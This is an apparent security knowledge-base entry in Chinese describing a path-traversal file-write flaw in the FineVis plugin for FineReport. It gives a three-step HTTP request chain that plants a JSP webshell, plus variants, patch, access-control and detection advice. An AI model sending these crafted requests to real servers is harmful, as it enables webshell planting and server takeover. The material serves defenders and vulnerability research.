---
id: web-generic-file-upload-finevis-theme-attach-metadata-path-write
title: FineVis 主题附件 metadata.name 路径穿越：三步链把上传内容写入 Web 根 getshell（FineVis 插件 2.7.1–2.9.0.2）
type: scenario
domain: web
path: web/generic/file-upload
technique: finevis-theme-attach-metadata-path-traversal-write
tags:
- java
- finereport
- finevis
- plugin
- file-upload
- path-traversal
- arbitrary-write
- webshell
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: FineVis 插件 2.7.1 - 2.9.0.2（4.7.1 已删除相关方法）
verification:
  verified_by: verifier-V40
  verified_at: '2026-11-05T06:25:42+08:00'
  notes: 已对照原文与图57-61核对：FineVis插件2.7.1~2.9.0.2；copy(id/sourceID/config)→attach(metadata.name=../../../../test.jsp)→resource2template三步链与截图代码一致；uploadAttachImage带@TemplateAuth(product=FVS)已在触发条件注明；4.7.1插件删除后两个方法。PoC未端到端复现、未本机执行。
url: /docs/web/generic/file-upload/web-generic-file-upload-finevis-theme-attach-metadata-path-write/
draft: false
kb_aliases:
- FineVis 任意文件写入
- 帆软 FineVis 插件
- DuchampThemeRequestService
- theme attach metadata name
- resource2template
- 主题附件路径穿越
---

## 一句话结论

安装 FineVis 插件 2.7.1–2.9.0.2 的 FineReport 工程暴露 `/webroot/decision/view/duchamp/theme/*` 接口；攻击者先用 `item/copy` 注册模板、再用 `attach` 上传文件并把 `metadata.name` 设为 `../../../../test.jsp`、最后用 `resource2template` 应用附件，插件会把上传内容按 metadata 中的路径写出，落在 Web 根形成 JSP WebShell。

## 原理

- `DuchampThemeRequestService#copy` 接收 `id`、`sourceID`、`config`，从 `FVSTemplateStyleConfig` 取模板样式；即使 `sourceID` 不存在也会新建，因此可任意指定 `id` 注册模板。
- `#uploadAttachImage`（`/theme/attach`）从请求中取 `id`、`attachID`、`metadata`，将上传文件字节通过 `templateStyle.addAttachImage(attachID, bytes)` 存入模板，并把 `metadata` 解析为 JSON 存入 `addAttachMetadata(attachID, metadata)`。
- `#applyThemeResource2Tpl`（`/theme/resource2template`）根据 `id` 取模板，按 `attachIDs` 取出附件，从元数据中读取 `name` 字段作为写入路径，把附件内容写入该路径。
- 漏洞在于 `metadata.name` 被当作文件系统路径直接使用，未做规范化、前缀校验或 `..` 过滤；`../../../../test.jsp` 可逃出插件资源目录，落到 Web 根。上传文件内容不限图片，文本内容会被原样写入，因此可写 JSP。
- 三个接口共享同一模板配置（`FVSTemplateStyleConfig`），`id`/`attachID` 把三步串成一条链；`sourceID` 可随便填，降低了前置条件。

## 触发条件

- FineReport 工程安装 FineVis 数据可视化插件，版本 2.7.1–2.9.0.2。
- `/webroot/decision/view/duchamp/theme/*` 接口可达；PoC 未带额外凭据，若工程启用模板认证需满足其校验。
- 插件资源目录与 Web 根在同一文件系统，且应用进程对目标 Web 目录有写权限（默认部署通常满足）。
- Web 服务器解析 JSP（或目标可写入其它可执行后缀）。

## 利用步骤

1. 注册/选择模板：`POST /theme/item/copy`，`id=test&sourceID=test&config={}`；`sourceID` 可不存在，服务端会新建。
2. 上传附件并注入路径：`POST /theme/attach?id=test&attachID=111&metadata={"name":"../../../../test.jsp"}`，multipart 文件内容为 JSP 代码；`id` 必须与第 1 步一致。
3. 应用附件到模板：`POST /theme/resource2template`，JSON `{"id":"test","attachIDs":["111"],"reuseIDs":[""],"tplPath":""}`；服务端按 metadata.name 写出文件。
4. 访问 `GET /webroot/test.jsp`，JSP 执行。
5. 按需改用其它相对深度/后缀，适配实际 Web 根位置。

## PoC

```http
POST /webroot/decision/view/duchamp/theme/item/copy HTTP/1.1
Host: localhost:8075
Content-Type: application/x-www-form-urlencoded

id=test&sourceID=test&config={}
```

```http
POST /webroot/decision/view/duchamp/theme/attach?id=test&attachID=111&metadata=%7B%22name%22%3A%22../../../../test.jsp%22%7D HTTP/1.1
Host: localhost:8075
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

<% out.println("test321abc") %>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

```http
POST /webroot/decision/view/duchamp/theme/resource2template HTTP/1.1
Host: localhost:8075
Content-Type: application/json

{"id":"test","attachIDs":["111"],"reuseIDs":[""],"tplPath":""}
```

```http
GET /webroot/test.jsp HTTP/1.1
Host: localhost:8075
```

## 变体与关联

- 路径深度可调：`../` 层数按插件资源目录到 Web 根的实际层级调整；也可写 `../../../../WEB-INF/` 下文件（能否执行取决于容器）。
- 附件内容不校验图片格式，可直接写 JSP/PHP（取决于 Web 服务器解析）；也可写 `.svg`/`.html` 做存储型 XSS。
- `id`/`attachID` 可枚举或碰撞；若目标已有模板，可复用其 `id` 减少一步。
- 与 [[web-generic-file-upload-ueditor-filepathformat-traversal]] 同属“上传路径由元数据/模板参数控制”的任意文件写；与 [[web-generic-file-upload-zip-slip-webshell-write]] 同属写 Web 根 getshell。
- 修复版本 4.7.1 删除后两个方法，链失效。

## 检测与防御

- 升级 FineVis 插件到 4.7.1+；不使用可视化的工程禁用/卸载该插件。
- 对 `/view/duchamp/theme/*` 做访问控制与来源限制；不允许匿名访问。
- 服务端对 `metadata.name` 只取 basename，拒绝 `..`、绝对路径、分隔符；写入前 `realpath` 校验必须位于插件资源目录内。
- 上传内容做类型/魔数校验，附件目录禁止脚本解析；Web 根与插件资源目录分离，降低写穿影响。
- 检测：请求 `metadata` 含 `../` 或绝对路径；`resource2template` 后 Web 目录出现新增 JSP/异常文件；`attach` 上传内容含 `<%`/`<?php` 等脚本特征；同一 `id` 短时间内连续 copy→attach→resource2template。
